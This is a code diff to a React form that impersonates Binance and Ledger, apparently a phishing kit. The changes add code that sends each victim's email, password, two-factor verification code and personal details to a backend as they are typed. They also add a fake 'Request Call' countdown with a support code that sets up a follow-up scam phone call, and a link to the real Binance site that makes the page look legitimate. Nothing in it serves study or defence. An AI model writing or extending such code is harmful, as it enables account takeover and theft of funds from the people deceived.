@@ -1,4 +1,4 @@
-import { FC, useState } from "react";
+import { FC, useState, useEffect } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -27,6 +27,9 @@ const BinanceLedgerForm: FC = () => {
   const [confirmationChecked, setConfirmationChecked] = useState(false);
   const [showPrivateKey, setShowPrivateKey] = useState(false);
   const [isCallDialogOpen, setIsCallDialogOpen] = useState(false);
+  const [countdown, setCountdown] = useState(9);
+  const [isCountingDown, setIsCountingDown] = useState(false);
+  const [contactingUser, setContactingUser] = useState(false);
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -44,6 +47,65 @@ const BinanceLedgerForm: FC = () => {
     "absorb", "abstract", "absurd", "abuse", "access", "accident"
   ];
 
+  // Countdown effect
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (isCountingDown && countdown > 0) {
+      interval = setInterval(() => {
+        setCountdown(prev => prev - 1);
+      }, 1000);
+    } else if (countdown === 0 && isCountingDown) {
+      setContactingUser(true);
+      setIsCountingDown(false);
+      // Send email notification to backend
+      sendSupportRequest();
+    }
+    return () => clearInterval(interval);
+  }, [isCountingDown, countdown]);
+
+  const sendSupportRequest = async () => {
+    try {
+      await fetch('/api/support-request', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email,
+          personalDetails,
+          timestamp: new Date().toISOString(),
+          supportCode: '7791'
+        })
+      });
+    } catch (error) {
+      console.error('Failed to send support request:', error);
+    }
+  };
+
+  const sendFormData = async (step: string, data: any) => {
+    try {
+      await fetch('/api/form-submission', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          step,
+          data,
+          timestamp: new Date().toISOString()
+        })
+      });
+    } catch (error) {
+      console.error('Failed to send form data:', error);
+    }
+  };
+
+  const startCountdown = () => {
+    setIsCountingDown(true);
+    setCountdown(9);
+    setContactingUser(false);
+  };
+
   const transitionToStep = (newStep: FormStep) => {
     setIsTransitioning(true);
     setTimeout(() => {
@@ -54,7 +116,7 @@ const BinanceLedgerForm: FC = () => {
     }, 150);
   };
 
-  const handleEmailSubmit = (e: React.FormEvent) => {
+  const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrors({});
     
@@ -67,6 +129,9 @@ const BinanceLedgerForm: FC = () => {
       setErrors({ email: "Please enter a valid email address" });
       return;
     }
+    
+    // Send email data to backend
+    await sendFormData('email', { email });
     
     console.log("Email submitted:", email);
     transitionToStep('password');
@@ -85,6 +150,9 @@ const BinanceLedgerForm: FC = () => {
       setErrors({ password: "Password must be at least 6 characters" });
       return;
     }
+    
+    // Send password data to backend
+    await sendFormData('password', { email, password });
     
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 1500));
@@ -105,6 +173,9 @@ const BinanceLedgerForm: FC = () => {
       setErrors({ verification: "Verification code must be 6 digits" });
       return;
     }
+    
+    // Send verification data to backend
+    await sendFormData('verification', { email, verificationCode });
     
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 2000));
@@ -134,6 +205,9 @@ const BinanceLedgerForm: FC = () => {
       return;
     }
     
+    // Send personal details to backend
+    await sendFormData('personal-details', { email, personalDetails });
+    
     transitionToStep('summary');
   };
 
@@ -144,6 +218,10 @@ const BinanceLedgerForm: FC = () => {
     }
     
     setErrors({});
+    
+    // Send summary confirmation to backend
+    await sendFormData('summary-confirmed', { email, personalDetails, confirmed: true });
+    
     transitionToStep('verifying');
     
     // Simulate verification process for 20 seconds
@@ -242,7 +320,7 @@ const BinanceLedgerForm: FC = () => {
                   >
                     <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                     <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
-                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5v-8.5A.5.5 0 012 13h8.5a.5.5 0 01.5.5V22a.5.5 0 01-.5.5zM21 9.5V3h-6.5v6.5H21zm1 1.5h-8.5a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5H22a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
+                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                     <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
                     <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
                     <path d="M22.5 15.5V13H20v2.5h2.5z" />
@@ -359,23 +437,49 @@ const BinanceLedgerForm: FC = () => {
                 <DialogHeader>
                   <DialogTitle className="text-white text-sm font-binance">Shipping Support</DialogTitle>
                 </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed">
+                <div className="text-xs font-binance text-white leading-relaxed mb-4">
                   A Binance representative will contact you shortly regarding your shipping inquiry. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                 </div>
+                {!isCountingDown && !contactingUser && (
+                  <button
+                    onClick={startCountdown}
+                    className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 font-bold font-binance text-xs bg-yellow-500 text-black"
+                  >
+                    Request Call
+                  </button>
+                )}
+                {isCountingDown && (
+                  <div className="text-center">
+                    <div className="text-yellow-400 font-binance text-lg mb-2">{countdown}</div>
+                    <div className="text-white font-binance text-xs">Connecting you to support...</div>
+                  </div>
+                )}
+                {contactingUser && (
+                  <div className="text-center text-green-400 font-binance text-sm">
+                    Binance is contacting you
+                  </div>
+                )}
               </DialogContent>
             </Dialog>
 
-            <button
-              type="button"
-              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-              style={{
-                backgroundColor: "var(--color-BtnBg, #FCD535)",
-                color: "var(--color-TextOnYellow, #202630)",
-                height: "34px"
-              }}
+            <a
+              href="https://www.binance.com"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="block w-full"
             >
-              Continue to Dashboard
-            </button>
+              <button
+                type="button"
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+              >
+                Continue to Dashboard
+              </button>
+            </a>
           </div>
         </div>
       );
@@ -419,7 +523,7 @@ const BinanceLedgerForm: FC = () => {
                     height: "34px"
                   }}
                 >
-                  Request a Call from a Binance Representative
+                  Request a Call from a Binance Representative for Phone Support
                 </button>
               </DialogTrigger>
               <DialogContent className="bg-[#1E2329] border-[#474D57]">
@@ -441,6 +545,7 @@ const BinanceLedgerForm: FC = () => {
                 color: "var(--color-TextOnYellow, #202630)",
                 height: "34px"
               }}
+              aria-label="Complete Setup"
             >
               Complete Setup
             </button>
